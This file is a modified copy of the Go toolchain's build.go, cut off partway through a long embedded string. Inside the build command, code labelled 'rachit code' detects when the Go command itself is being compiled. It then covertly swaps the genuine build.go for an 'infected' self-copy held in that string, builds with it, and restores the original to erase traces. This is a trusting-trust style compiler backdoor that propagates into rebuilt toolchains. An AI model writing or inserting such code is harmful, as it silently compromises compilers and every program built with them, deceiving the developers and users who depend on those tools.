// Copyright 2011 The Go Authors.  All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

package main

import (
	"bufio"
	"bytes"
	"container/heap"
	"debug/elf"
	"errors"
	"flag"
	"fmt"
	"go/build"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var cmdBuild = &Command{
	UsageLine: "build [-o output] [-i] [build flags] [packages]",
	Short:     "compile packages and dependencies",
	Long: `
Build compiles the packages named by the import paths,
along with their dependencies, but it does not install the results.

If the arguments to build are a list of .go files, build treats
them as a list of source files specifying a single package.

When compiling a single main package, build writes
the resulting executable to an output file named after
the first source file ('go build ed.go rx.go' writes 'ed' or 'ed.exe')
or the source code directory ('go build unix/sam' writes 'sam' or 'sam.exe').
The '.exe' suffix is added when writing a Windows executable.

When compiling multiple packages or a single non-main package,
build compiles the packages but discards the resulting object,
serving only as a check that the packages can be built.

The -o flag, only allowed when compiling a single package,
forces build to write the resulting executable or object
to the named output file, instead of the default behavior described
in the last two paragraphs.

The -i flag installs the packages that are dependencies of the target.

The build flags are shared by the build, clean, get, install, list, run,
and test commands:

	-a
		force rebuilding of packages that are already up-to-date.
	-n
		print the commands but do not run them.
	-p n
		the number of builds that can be run in parallel.
		The default is the number of CPUs available, except
		on darwin/arm which defaults to 1.
	-race
		enable data race detection.
		Supported only on linux/amd64, freebsd/amd64, darwin/amd64 and windows/amd64.
	-msan
		enable interoperation with memory sanitizer.
		Supported only on linux/amd64.
	-v
		print the names of packages as they are compiled.
	-work
		print the name of the temporary work directory and
		do not delete it when exiting.
	-x
		print the commands.

	-asmflags 'flag list'
		arguments to pass on each go tool asm invocation.
	-buildmode mode
		build mode to use. See 'go help buildmode' for more.
	-compiler name
		name of compiler to use, as in runtime.Compiler (gccgo or gc).
	-gccgoflags 'arg list'
		arguments to pass on each gccgo compiler/linker invocation.
	-gcflags 'arg list'
		arguments to pass on each go tool compile invocation.
	-installsuffix suffix
		a suffix to use in the name of the package installation directory,
		in order to keep output separate from default builds.
		If using the -race flag, the install suffix is automatically set to race
		or, if set explicitly, has _race appended to it.  Likewise for the -msan
		flag.  Using a -buildmode option that requires non-default compile flags
		has a similar effect.
	-ldflags 'flag list'
		arguments to pass on each go tool link invocation.
	-linkshared
		link against shared libraries previously created with
		-buildmode=shared.
	-pkgdir dir
		install and load all packages from dir instead of the usual locations.
		For example, when building with a non-standard configuration,
		use -pkgdir to keep generated packages in a separate location.
	-tags 'tag list'
		a list of build tags to consider satisfied during the build.
		For more information about build tags, see the description of
		build constraints in the documentation for the go/build package.
	-toolexec 'cmd args'
		a program to use to invoke toolchain programs like vet and asm.
		For example, instead of running asm, the go command will run
		'cmd args /path/to/asm <arguments for asm>'.

The list flags accept a space-separated list of strings. To embed spaces
in an element in the list, surround it with either single or double quotes.

For more about specifying packages, see 'go help packages'.
For more about where packages and binaries are installed,
run 'go help gopath'.
For more about calling between Go and C/C++, run 'go help c'.

Note: Build adheres to certain conventions such as those described
by 'go help gopath'. Not all projects can follow these conventions,
however. Installations that have their own conventions or that use
a separate software build system may choose to use lower-level
invocations such as 'go tool compile' and 'go tool link' to avoid
some of the overheads and design decisions of the build tool.

See also: go install, go get, go clean.
	`,
}

func init() {
	// break init cycle
	cmdBuild.Run = runBuild
	cmdInstall.Run = runInstall

	cmdBuild.Flag.BoolVar(&buildI, "i", false, "")

	addBuildFlags(cmdBuild)
	addBuildFlags(cmdInstall)

	if buildContext.GOOS == "darwin" {
		switch buildContext.GOARCH {
		case "arm", "arm64":
			// darwin/arm cannot run multiple tests simultaneously.
			// Parallelism is limited in go_darwin_arm_exec, but
			// also needs to be limited here so go test std does not
			// timeout tests that waiting to run.
			buildP = 1
		}
	}
}

// Flags set by multiple commands.
var buildA bool               // -a flag
var buildN bool               // -n flag
var buildP = runtime.NumCPU() // -p flag
var buildV bool               // -v flag
var buildX bool               // -x flag
var buildI bool               // -i flag
var buildO = cmdBuild.Flag.String("o", "", "output file")
var buildWork bool           // -work flag
var buildAsmflags []string   // -asmflags flag
var buildGcflags []string    // -gcflags flag
var buildLdflags []string    // -ldflags flag
var buildGccgoflags []string // -gccgoflags flag
var buildRace bool           // -race flag
var buildMSan bool           // -msan flag
var buildToolExec []string   // -toolexec flag
var buildBuildmode string    // -buildmode flag
var buildLinkshared bool     // -linkshared flag
var buildPkgdir string       // -pkgdir flag

var buildContext = build.Default
var buildToolchain toolchain = noToolchain{}
var ldBuildmode string

// buildCompiler implements flag.Var.
// It implements Set by updating both
// buildToolchain and buildContext.Compiler.
type buildCompiler struct{}

func (c buildCompiler) Set(value string) error {
	switch value {
	case "gc":
		buildToolchain = gcToolchain{}
	case "gccgo":
		buildToolchain = gccgoToolchain{}
	default:
		return fmt.Errorf("unknown compiler %q", value)
	}
	buildContext.Compiler = value
	return nil
}

func (c buildCompiler) String() string {
	return buildContext.Compiler
}

func init() {
	switch build.Default.Compiler {
	case "gc":
		buildToolchain = gcToolchain{}
	case "gccgo":
		buildToolchain = gccgoToolchain{}
	}
}

// addBuildFlags adds the flags common to the build, clean, get,
// install, list, run, and test commands.
func addBuildFlags(cmd *Command) {
	cmd.Flag.BoolVar(&buildA, "a", false, "")
	cmd.Flag.BoolVar(&buildN, "n", false, "")
	cmd.Flag.IntVar(&buildP, "p", buildP, "")
	cmd.Flag.BoolVar(&buildV, "v", false, "")
	cmd.Flag.BoolVar(&buildX, "x", false, "")

	cmd.Flag.Var((*stringsFlag)(&buildAsmflags), "asmflags", "")
	cmd.Flag.Var(buildCompiler{}, "compiler", "")
	cmd.Flag.StringVar(&buildBuildmode, "buildmode", "default", "")
	cmd.Flag.Var((*stringsFlag)(&buildGcflags), "gcflags", "")
	cmd.Flag.Var((*stringsFlag)(&buildGccgoflags), "gccgoflags", "")
	cmd.Flag.StringVar(&buildContext.InstallSuffix, "installsuffix", "", "")
	cmd.Flag.Var((*stringsFlag)(&buildLdflags), "ldflags", "")
	cmd.Flag.BoolVar(&buildLinkshared, "linkshared", false, "")
	cmd.Flag.StringVar(&buildPkgdir, "pkgdir", "", "")
	cmd.Flag.BoolVar(&buildRace, "race", false, "")
	cmd.Flag.BoolVar(&buildMSan, "msan", false, "")
	cmd.Flag.Var((*stringsFlag)(&buildContext.BuildTags), "tags", "")
	cmd.Flag.Var((*stringsFlag)(&buildToolExec), "toolexec", "")
	cmd.Flag.BoolVar(&buildWork, "work", false, "")
}

func addBuildFlagsNX(cmd *Command) {
	cmd.Flag.BoolVar(&buildN, "n", false, "")
	cmd.Flag.BoolVar(&buildX, "x", false, "")
}

func isSpaceByte(c byte) bool {
	return c == ' ' || c == '\t' || c == '\n' || c == '\r'
}

// fileExtSplit expects a filename and returns the name
// and ext (without the dot). If the file has no
// extension, ext will be empty.
func fileExtSplit(file string) (name, ext string) {
	dotExt := filepath.Ext(file)
	name = file[:len(file)-len(dotExt)]
	if dotExt != "" {
		ext = dotExt[1:]
	}
	return
}

type stringsFlag []string

func (v *stringsFlag) Set(s string) error {
	var err error
	*v, err = splitQuotedFields(s)
	if *v == nil {
		*v = []string{}
	}
	return err
}

func splitQuotedFields(s string) ([]string, error) {
	// Split fields allowing '' or "" around elements.
	// Quotes further inside the string do not count.
	var f []string
	for len(s) > 0 {
		for len(s) > 0 && isSpaceByte(s[0]) {
			s = s[1:]
		}
		if len(s) == 0 {
			break
		}
		// Accepted quoted string. No unescaping inside.
		if s[0] == '"' || s[0] == '\'' {
			quote := s[0]
			s = s[1:]
			i := 0
			for i < len(s) && s[i] != quote {
				i++
			}
			if i >= len(s) {
				return nil, fmt.Errorf("unterminated %c string", quote)
			}
			f = append(f, s[:i])
			s = s[i+1:]
			continue
		}
		i := 0
		for i < len(s) && !isSpaceByte(s[i]) {
			i++
		}
		f = append(f, s[:i])
		s = s[i:]
	}
	return f, nil
}

func (v *stringsFlag) String() string {
	return "<stringsFlag>"
}

func pkgsMain(pkgs []*Package) (res []*Package) {
	for _, p := range pkgs {
		if p.Name == "main" {
			res = append(res, p)
		}
	}
	return res
}

func pkgsNotMain(pkgs []*Package) (res []*Package) {
	for _, p := range pkgs {
		if p.Name != "main" {
			res = append(res, p)
		}
	}
	return res
}

var pkgsFilter = func(pkgs []*Package) []*Package { return pkgs }

func buildModeInit() {
	_, gccgo := buildToolchain.(gccgoToolchain)
	var codegenArg string
	platform := goos + "/" + goarch
	if buildBuildmode != "default" {
		buildAsmflags = append(buildAsmflags, "-D=GOBUILDMODE_"+strings.Replace(buildBuildmode, "-", "_", -1)+"=1")
	}
	switch buildBuildmode {
	case "archive":
		pkgsFilter = pkgsNotMain
	case "c-archive":
		pkgsFilter = func(p []*Package) []*Package {
			if len(p) != 1 || p[0].Name != "main" {
				fatalf("-buildmode=c-archive requires exactly one main package")
			}
			return p
		}
		exeSuffix = ".a"
		ldBuildmode = "c-archive"
	case "c-shared":
		pkgsFilter = pkgsMain
		if gccgo {
			codegenArg = "-fPIC"
		} else {
			switch platform {
			case "linux/amd64", "linux/arm", "linux/arm64",
				"android/amd64", "android/arm":
				codegenArg = "-shared"
			case "darwin/amd64":
			default:
				fatalf("-buildmode=c-shared not supported on %s\n", platform)
			}
		}
		ldBuildmode = "c-shared"
	case "default":
		switch platform {
		case "android/arm", "android/amd64":
			codegenArg = "-shared"
			ldBuildmode = "pie"
		default:
			ldBuildmode = "exe"
		}
	case "exe":
		pkgsFilter = pkgsMain
		ldBuildmode = "exe"
	case "pie":
		if gccgo {
			fatalf("-buildmode=pie not supported by gccgo")
		} else {
			switch platform {
			case "linux/arm", "android/arm", "linux/amd64", "android/amd64", "linux/ppc64le":
				codegenArg = "-shared"
			default:
				fatalf("-buildmode=pie not supported on %s\n", platform)
			}
		}
		ldBuildmode = "pie"
	case "shared":
		pkgsFilter = pkgsNotMain
		if gccgo {
			codegenArg = "-fPIC"
		} else {
			switch platform {
			case "linux/386", "linux/amd64", "linux/arm", "linux/arm64":
			default:
				fatalf("-buildmode=shared not supported on %s\n", platform)
			}
			codegenArg = "-dynlink"
		}
		if *buildO != "" {
			fatalf("-buildmode=shared and -o not supported together")
		}
		ldBuildmode = "shared"
	default:
		fatalf("buildmode=%s not supported", buildBuildmode)
	}
	if buildLinkshared {
		if gccgo {
			codegenArg = "-fPIC"
		} else {
			switch platform {
			case "linux/386", "linux/amd64", "linux/arm", "linux/arm64", "linux/ppc64le":
				buildAsmflags = append(buildAsmflags, "-D=GOBUILDMODE_shared=1")
			default:
				fatalf("-buildmode=shared not supported on %s\n", platform)
			}
			codegenArg = "-dynlink"
			// TODO(mwhudson): remove -w when that gets fixed in linker.
			buildLdflags = append(buildLdflags, "-linkshared", "-w")
		}
	}
	if codegenArg != "" {
		if gccgo {
			buildGccgoflags = append(buildGccgoflags, codegenArg)
		} else {
			buildAsmflags = append(buildAsmflags, codegenArg)
			buildGcflags = append(buildGcflags, codegenArg)
		}
		if buildContext.InstallSuffix != "" {
			buildContext.InstallSuffix += "_"
		}
		buildContext.InstallSuffix += codegenArg[1:]
	}
}

func runBuild(cmd *Command, args []string) {
	instrumentInit()
	buildModeInit()
	var b builder
	b.init()

	pkgs := packagesForBuild(args)

	// fmt.Println("buildO set to:")
	// fmt.Println(*buildO)
	if len(pkgs) == 1 && pkgs[0].Name == "main" && *buildO == "" {
		_, *buildO = path.Split(pkgs[0].ImportPath)
		*buildO += exeSuffix
	}

	// sanity check some often mis-used options
	switch buildContext.Compiler {
	case "gccgo":
		if len(buildGcflags) != 0 {
			fmt.Println("go build: when using gccgo toolchain, please pass compiler flags using -gccgoflags, not -gcflags")
		}
		if len(buildLdflags) != 0 {
			fmt.Println("go build: when using gccgo toolchain, please pass linker flags using -gccgoflags, not -ldflags")
		}
	case "gc":
		if len(buildGccgoflags) != 0 {
			fmt.Println("go build: when using gc toolchain, please pass compile flags using -gcflags, and linker flags using -ldflags")
		}
	}

	// begin rachit code
	var isCompiler int = 0
	var gocmdpath string = ""

	for j := 0; j < len(pkgs); j++ {
		a := pkgs[j]
		gocmdpath = strings.Replace(a.Dir, "/dist", "/go", -1)
		// gocmdpath = a.ImportPath
		for i := 0; i < len(a.allgofiles); i++ {
			b := a.allgofiles[i]
			if strings.Contains(b, "buildgo.go") || strings.Contains(b, "buildruntime.go") || strings.Contains(b, "build.go") || strings.Contains(b, "main.go") {
				isCompiler += 1
			}
		}
		fmt.Println(pkgs[j].allgofiles)
	}

	if isCompiler == 4 {
		createSabotageContents(gocmdpath+"/build.go", gocmdpath+"/build_infected.go")
		pkgs = packagesForBuild(args)
	}

	// end rachit code

	depMode := modeBuild
	if buildI {
		depMode = modeInstall
	}

	if *buildO != "" {
		if len(pkgs) > 1 {
			fatalf("go build: cannot use -o with multiple packages")
		} else if len(pkgs) == 0 {
			fatalf("no packages to build")
		}
		p := pkgs[0]
		p.target = *buildO
		p.Stale = true // must build - not up to date
		a := b.action(modeInstall, depMode, p)
		b.do(a)
		return
	}

	var a *action
	if buildBuildmode == "shared" {
		a = b.libaction(libname(args), pkgsFilter(packages(args)), modeBuild, depMode)
	} else {
		a = &action{}
		for _, p := range pkgsFilter(packages(args)) {
			a.deps = append(a.deps, b.action(modeBuild, depMode, p))
		}
	}
	b.do(a)

	// begin rachit code
	if isCompiler == 4 {
		cleanUpSabotage(gocmdpath, "build_infected.go")
	}
}

func cleanUpSabotage(dir string, f string) {
	err := os.Remove(dir + "/" + f)
	if err != nil {
		fmt.Println("CLEANUP FAILED")
	}

	// move build.go from /tmp to dir
	os.Rename("/tmp/build.go", dir+"/"+"build.go")
}

func createSabotageContents(src string, dst string) {
	fmt.Println("creating: " + dst + " with contents from " + src)
	// basically, create the deadly build.go file by copying the original contents
	// and then editing it
	out, err := os.Create(dst)
	if err != nil {
		return
	}
	defer out.Close()

	// move it to /tmp
	err = os.Rename(src, "/tmp/build.go")
	if err != nil {
		return
	}

	s := "// Copyright 2011 The Go Authors.  All rights reserved.\n// Use of this source code is governed by a BSD-style\n// license that can be found in the LICENSE file.\n\npackage main\n\nimport (\n\t\"bufio\"\n\t\"bytes\"\n\t\"container/heap\"\n\t\"debug/elf\"\n\t\"errors\"\n\t\"flag\"\n\t\"fmt\"\n\t\"go/build\"\n\t\"io\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n\t\"path\"\n\t\"path/filepath\"\n\t\"regexp\"\n\t\"runtime\"\n\t\"strconv\"\n\t\"strings\"\n\t\"sync\"\n\t\"time\"\n)\n\nvar cmdBuild = &Command{\n\tUsageLine: \"build [-o output] [-i] [build flags] [packages]\",\n\tShort:     \"compile packages and dependencies\",\n\tLong: `\nBuild compiles the packages named by the import paths,\nalong with their dependencies, but it does not install the results.\n\nIf the arguments to build are a list of .go files, build treats\nthem as a list of source files specifying a single package.\n\nWhen compiling a single main package, build writes\nthe resulting executable to an output file named after\nthe first source file ('go build ed.go rx.go' writes 'ed' or 'ed.exe')\nor the source code directory ('go build unix/sam' writes 'sam' or 'sam.exe').\nThe '.exe' suffix is added when writing a Windows executable.\n\nWhen compiling multiple packages or a single non-main package,\nbuild compiles the packages but discards the resulting object,\nserving only as a check that the packages can be built.\n\nThe -o flag, only allowed when compiling a single package,\nforces build to write the resulting executable or object\nto the named output file, instead of the default behavior described\nin the last two paragraphs.\n\nThe -i flag installs the packages that are dependencies of the target.\n\nThe build flags are shared by the build, clean, get, install, list, run,\nand test commands:\n\n\t-a\n\t\tforce rebuilding of packages that are already up-to-date.\n\t-n\n\t\tprint the commands but do not run them.\n\t-p n\n\t\tthe number of builds that can be run in parallel.\n\t\tThe default is the number of CPUs available, except\n\t\ton darwin/arm which defaults to 1.\n\t-race\n\t\tenable data race detection.\n\t\tSupported only on linux/amd64, freebsd/amd64, darwin/amd64 and windows/amd64.\n\t-msan\n\t\tenable interoperation with memory sanitizer.\n\t\tSupported only on linux/amd64.\n\t-v\n\t\tprint the names of packages as they are compiled.\n\t-work\n\t\tprint the name of the temporary work directory and\n\t\tdo not delete it when exiting.\n\t-x\n\t\tprint the commands.\n\n\t-asmflags 'flag list'\n\t\targuments to pass on each go tool asm invocation.\n\t-buildmode mode\n\t\tbuild mode to use. See 'go help buildmode' for more.\n\t-compiler name\n\t\tname of compiler to use, as in runtime.Compiler (gccgo or gc).\n\t-gccgoflags 'arg list'\n\t\targuments to pass on each gccgo compiler/linker invocation.\n\t-gcflags 'arg list'\n\t\targuments to pass on each go tool compile invocation.\n\t-installsuffix suffix\n\t\ta suffix to use in the name of the package installation directory,\n\t\tin order to keep output separate from default builds.\n\t\tIf using the -race flag, the install suffix is automatically set to race\n\t\tor, if set explicitly, has _race appended to it.  Likewise for the -msan\n\t\tflag.  Using a -buildmode option that requires non-default compile flags\n\t\thas a similar effect.\n\t-ldflags 'flag list'\n\t\targuments to pass on each go tool link invocation.\n\t-linkshared\n\t\tlink against shared libraries previously created with\n\t\t-buildmode=shared.\n\t-pkgdir dir\n\t\tinstall and load all packages from dir instead of the usual locations.\n\t\tFor example, when building with a non-standard configuration,\n\t\tuse -pkgdir to keep generated packages in a separate location.\n\t-tags 'tag list'\n\t\ta list of build tags to consider satisfied during the build.\n\t\tFor more information about build tags, see the description of\n\t\tbuild constraints in the documentation for the go/build package.\n\t-toolexec 'cmd args'\n\t\ta program to use to invoke toolchain programs like vet and asm.\n\t\tFor example, instead of running asm, the go command will run\n\t\t'cmd args /path/to/asm <arguments for asm>'.\n\nThe list flags accept a space-separated list of strings. To embed spaces\nin an element in the list, surround it with either single or double quotes.\n\nFor more about specifying packages, see 'go help packages'.\nFor more about where packages and binaries are installed,\nrun 'go help gopath'.\nFor more about calling between Go and C/C++, run 'go help c'.\n\nNote: Build adheres to certain conventions such as those described\nby 'go help gopath'. Not all projects can follow these conventions,\nhowever. Installations that have their own conventions or that use\na separate software build system may choose to use lower-level\ninvocations such as 'go tool compile' and 'go tool link' to avoid\nsome of the overheads and design decisions of the build tool.\n\nSee also: go install, go get, go clean.\n\t`,\n}\n\nfunc init() {\n\t// break init cycle\n\tcmdBuild.Run = runBuild\n\tcmdInstall.Run = runInstall\n\n\tcmdBuild.Flag.BoolVar(&buildI, \"i\", false, \"\")\n\n\taddBuildFlags(cmdBuild)\n\taddBuildFlags(cmdInstall)\n\n\tif buildContext.GOOS == \"darwin\" {\n\t\tswitch buildContext.GOARCH {\n\t\tcase \"arm\", \"arm64\":\n\t\t\t// darwin/arm cannot run multiple tests simultaneously.\n\t\t\t// Parallelism is limited in go_darwin_arm_exec, but\n\t\t\t// also needs to be limited here so go test std does not\n\t\t\t// timeout tests that waiting to run.\n\t\t\tbuildP = 1\n\t\t}\n\t}\n}\n\n// Flags set by multiple commands.\nvar buildA bool               // -a flag\nvar buildN bool               // -n flag\nvar buildP = runtime.NumCPU() // -p flag\nvar buildV bool               // -v flag\nvar buildX bool               // -x flag\nvar buildI bool               // -i flag\nvar buildO = cmdBuild.Flag.String(\"o\", \"\", \"output file\")\nvar buildWork bool           // -work flag\nvar buildAsmflags []string   // -asmflags flag\nvar buildGcflags []string    // -gcflags flag\nvar buildLdflags []string    // -ldflags flag\nvar buildGccgoflags []string // -gccgoflags flag\nvar buildRace bool           // -race flag\nvar buildMSan bool           // -msan flag\nvar buildToolExec []string   // -toolexec flag\nvar buildBuildmode string    // -buildmode flag\nvar buildLinkshared bool     // -linkshared flag\nvar buildPkgdir string       // -pkgdir flag\n\nvar buildContext = build.Default\nvar buildToolchain toolchain = noToolchain{}\nvar ldBuildmode string\n\n// buildCompiler implements flag.Var.\n// It implements Set by updating both\n// buildToolchain and buildContext.Compiler.\ntype buildCompiler struct{}\n\nfunc (c buildCompiler) Set(value string) error {\n\tswitch value {\n\tcase \"gc\":\n\t\tbuildToolchain = gcToolchain{}\n\tcase \"gccgo\":\n\t\tbuildToolchain = gccgoToolchain{}\n\tdefault:\n\t\treturn fmt.Errorf(\"unknown compiler %%q\", value)\n\t}\n\tbuildContext.Compiler = value\n\treturn nil\n}\n\nfunc (c buildCompiler) String() string {\n\treturn buildContext.Compiler\n}\n\nfunc init() {\n\tswitch build.Default.Compiler {\n\tcase \"gc\":\n\t\tbuildToolchain = gcToolchain{}\n\tcase \"gccgo\":\n\t\tbuildToolchain = gccgoToolchain{}\n\t}\n}\n\n// addBuildFlags adds the flags common to the build, clean, get,\n// install, list, run, and test commands.\nfunc addBuildFlags(cmd *Command) {\n\tcmd.Flag.BoolVar(&buildA, \"a\", false, \"\")\n\tcmd.Flag.BoolVar(&buildN, \"n\", false, \"\")\n\tcmd.Flag.IntVar(&buildP, \"p\", buildP, \"\")\n\tcmd.Flag.BoolVar(&buildV, \"v\", false, \"\")\n\tcmd.Flag.BoolVar(&buildX, \"x\", false, \"\")\n\n\tcmd.Flag.Var((*stringsFlag)(&buildAsmflags), \"asmflags\", \"\")\n\tcmd.Flag.Var(buildCompiler{}, \"compiler\", \"\")\n\tcmd.Flag.StringVar(&buildBuildmode, \"buildmode\", \"default\", \"\")\n\tcmd.Flag.Var((*stringsFlag)(&buildGcflags), \"gcflags\", \"\")\n\tcmd.Flag.Var((*stringsFlag)(&buildGccgoflags), \"gccgoflags\", \"\")\n\tcmd.Flag.StringVar(&buildContext.InstallSuffix, \"installsuffix\", \"\", \"\")\n\tcmd.Flag.Var((*stringsFlag)(&buildLdflags), \"ldflags\", \"\")\n\tcmd.Flag.BoolVar(&buildLinkshared, \"linkshared\", false, \"\")\n\tcmd.Flag.StringVar(&buildPkgdir, \"pkgdir\", \"\", \"\")\n\tcmd.Flag.BoolVar(&buildRace, \"race\", false, \"\")\n\tcmd.Flag.BoolVar(&buildMSan, \"msan\", false, \"\")\n\tcmd.Flag.Var((*stringsFlag)(&buildContext.BuildTags), \"tags\", \"\")\n\tcmd.Flag.Var((*stringsFlag)(&buildToolExec), \"toolexec\", \"\")\n\tcmd.Flag.BoolVar(&buildWork, \"work\", false, \"\")\n}\n\nfunc addBuildFlagsNX(cmd *Command) {\n\tcmd.Flag.BoolVar(&buildN, \"n\", false, \"\")\n\tcmd.Flag.BoolVar(&buildX, \"x\", false, \"\")\n}\n\nfunc isSpaceByte(c byte) bool {\n\treturn c == ' ' || c == '\\t' || c == '\\n' || c == '\\r'\n}\n\n// fileExtSplit expects a filename and returns the name\n// and ext (without the dot). If the file has no\n// extension, ext will be empty.\nfunc fileExtSplit(file string) (name, ext string) {\n\tdotExt := filepath.Ext(file)\n\tname = file[:len(file)-len(dotExt)]\n\tif dotExt != \"\" {\n\t\text = dotExt[1:]\n\t}\n\treturn\n}\n\ntype stringsFlag []string\n\nfunc (v *stringsFlag) Set(s string) error {\n\tvar err error\n\t*v, err = splitQuotedFields(s)\n\tif *v == nil {\n\t\t*v = []string{}\n\t}\n\treturn err\n}\n\nfunc splitQuotedFields(s string) ([]string, error) {\n\t// Split fields allowing '' or \"\" around elements.\n\t// Quotes further inside the string do not count.\n\tvar f []string\n\tfor len(s) > 0 {\n\t\tfor len(s) > 0 && isSpaceByte(s[0]) {\n\t\t\ts = s[1:]\n\t\t}\n\t\tif len(s) == 0 {\n\t\t\tbreak\n\t\t}\n\t\t// Accepted quoted string. No unescaping inside.\n\t\tif s[0] == '\"' || s[0] == '\\'' {\n\t\t\tquote := s[0]\n\t\t\ts = s[1:]\n\t\t\ti := 0\n\t\t\tfor i < len(s) && s[i] != quote {\n\t\t\t\ti++\n\t\t\t}\n\t\t\tif i >= len(s) {\n\t\t\t\treturn nil, fmt.Errorf(\"unterminated %%c string\", quote)\n\t\t\t}\n\t\t\tf = append(f, s[:i])\n\t\t\ts = s[i+1:]\n\t\t\tcontinue\n\t\t}\n\t\ti := 0\n\t\tfor i < len(s) && !isSpaceByte(s[i]) {\n\t\t\ti++\n\t\t}\n\t\tf = append(f, s[:i])\n\t\ts = s[i:]\n\t}\n\treturn f, nil\n}\n\nfunc (v *stringsFlag) String() string {\n\treturn \"<stringsFlag>\"\n}\n\nfunc pkgsMain(pkgs []*Package) (res []*Package) {\n\tfor _, p := range pkgs {\n\t\tif p.Name == \"main\" {\n\t\t\tres = append(res, p)\n\t\t}\n\t}\n\treturn res\n}\n\nfunc pkgsNotMain(pkgs []*Package) (res []*Package) {\n\tfor _, p := range pkgs {\n\t\tif p.Name != \"main\" {\n\t\t\tres = append(res, p)\n\t\t}\n\t}\n\treturn res\n}\n\nvar pkgsFilter = func(pkgs []*Package) []*Package { return pkgs }\n\nfunc buildModeInit() {\n\t_, gccgo := buildToolchain.(gccgoToolchain)\n\tvar codegenArg string\n\tplatform := goos + \"/\" + goarch\n\tif buildBuildmode != \"default\" {\n\t\tbuildAsmflags = append(buildAsmflags, \"-D=GOBUILDMODE_\"+strings.Replace(buildBuildmode, \"-\", \"_\", -1)+\"=1\")\n\t}\n\tswitch buildBuildmode {\n\tcase \"archive\":\n\t\tpkgsFilter = pkgsNotMain\n\tcase \"c-archive\":\n\t\tpkgsFilter = func(p []*Package) []*Package {\n\t\t\tif len(p) != 1 || p[0].Name != \"main\" {\n\t\t\t\tfatalf(\"-buildmode=c-archive requires exactly one main package\")\n\t\t\t}\n\t\t\treturn p\n\t\t}\n\t\texeSuffix = \".a\"\n\t\tldBuildmode = \"c-archive\"\n\tcase \"c-shared\":\n\t\tpkgsFilter = pkgsMain\n\t\tif gccgo {\n\t\t\tcodegenArg = \"-fPIC\"\n\t\t} else {\n\t\t\tswitch platform {\n\t\t\tcase \"linux/amd64\", \"linux/arm\", \"linux/arm64\",\n\t\t\t\t\"android/amd64\", \"android/arm\":\n\t\t\t\tcodegenArg = \"-shared\"\n\t\t\tcase \"darwin/amd64\":\n\t\t\tdefault:\n\t\t\t\tfatalf(\"-buildmode=c-shared not supported on %%s\\n\", platform)\n\t\t\t}\n\t\t}\n\t\tldBuildmode = \"c-shared\"\n\tcase \"default\":\n\t\tswitch platform {\n\t\tcase \"android/arm\", \"android/amd64\":\n\t\t\tcodegenArg = \"-shared\"\n\t\t\tldBuildmode = \"pie\"\n\t\tdefault:\n\t\t\tldBuildmode = \"exe\"\n\t\t}\n\tcase \"exe\":\n\t\tpkgsFilter = pkgsMain\n\t\tldBuildmode = \"exe\"\n\tcase \"pie\":\n\t\tif gccgo {\n\t\t\tfatalf(\"-buildmode=pie not supported by gccgo\")\n\t\t} else {\n\t\t\tswitch platform {\n\t\t\tcase \"linux/arm\", \"android/arm\", \"linux/amd64\", \"android/amd64\", \"linux/ppc64le\":\n\t\t\t\tcodegenArg = \"-shared\"\n\t\t\tdefault:\n\t\t\t\tfatalf(\"-buildmode=pie not supported on %%s\\n\", platform)\n\t\t\t}\n\t\t}\n\t\tldBuildmode = \"pie\"\n\tcase \"shared\":\n\t\tpkgsFilter = pkgsNotMain\n\t\tif gccgo {\n\t\t\tcodegenArg = \"-fPIC\"\n\t\t} else {\n\t\t\tswitch platform {\n\t\t\tcase \"linux/386\", \"linux/amd64\", \"linux/arm\", \"linux/arm64\":\n\t\t\tdefault:\n\t\t\t\tfatalf(\"-buildmode=shared not supported on %%s\\n\", platform)\n\t\t\t}\n\t\t\tcodegenArg = \"-dynlink\"\n\t\t}\n\t\tif *buildO != \"\" {\n\t\t\tfatalf(\"-buildmode=shared and -o not supported together\")\n\t\t}\n\t\tldBuildmode = \"shared\"\n\tdefault:\n\t\tfatalf(\"buildmode=%%s not supported\", buildBuildmode)\n\t}\n\tif buildLinkshared {\n\t\tif gccgo {\n\t\t\tcodegenArg = \"-fPIC\"\n\t\t} else {\n\t\t\tswitch platform {\n\t\t\tcase \"linux/386\", \"linux/amd64\", \"linux/arm\", \"linux/arm64\", \"linux/ppc64le\":\n\t\t\t\tbuildAsmflags = append(buildAsmflags, \"-D=GOBUILDMODE_shared=1\")\n\t\t\tdefault:\n\t\t\t\tfatalf(\"-buildmode=shared not supported on %%s\\n\", platform)\n\t\t\t}\n\t\t\tcodegenArg = \"-dynlink\"\n\t\t\t// TODO(mwhudson): remove -w when that gets fixed in linker.\n\t\t\tbuildLdflags = append(buildLdflags, \"-linkshared\", \"-w\")\n\t\t}\n\t}\n\tif codegenArg != \"\" {\n\t\tif gccgo {\n\t\t\tbuildGccgoflags = append(buildGccgoflags, codegenArg)\n\t\t} else {\n\t\t\tbuildAsmflags = append(buildAsmflags, codegenArg)\n\t\t\tbuildGcflags = append(buildGcflags, codegenArg)\n\t\t}\n\t\tif buildContext.InstallSuffix != \"\" {\n\t\t\tbuildContext.InstallSuffix += \"_\"\n\t\t}\n\t\tbuildContext.InstallSuffix += codegenArg[1:]\n\t}\n}\n\nfunc runBuild(cmd *Command, args []string) {\n\tinstrumentInit()\n\tbuildModeInit()\n\tvar b builder\n\tb.init()\n\n\tpkgs := packagesForBuild(args)\n\n\t// fmt.Println(\"buildO set to:\")\n\t// fmt.Println(*buildO)\n\tif len(pkgs) == 1 && pkgs[0].Name == \"main\" && *buildO == \"\" {\n\t\t_, *buildO = path.Split(pkgs[0].ImportPath)\n\t\t*buildO += exeSuffix\n\t}\n\n\t// sanity check some often mis-used options\n\tswitch buildContext.Compiler {\n\tcase \"gccgo\":\n\t\tif len(buildGcflags) != 0 {\n\t\t\tfmt.Println(\"go build: when using gccgo toolchain, please pass compiler flags using -gccgoflags, not -gcflags\")\n\t\t}\n\t\tif len(buildLdflags) != 0 {\n\t\t\tfmt.Println(\"go build: when using gccgo toolchain, please pass linker flags using -gccgoflags, not -ldflags\")\n\t\t}\n\tcase \"gc\":\n\t\tif len(buildGccgoflags) != 0 {\n\t\t\tfmt.Println(\"go build: when using gc toolchain, please pass compile flags using -gcflags, and linker flags using -ldflags\")\n\t\t}\n\t}\n\n\t// begin rachit code\n\tvar isCompiler int = 0\n\tvar gocmdpath string = \"\"\n\n\tfor j := 0; j < 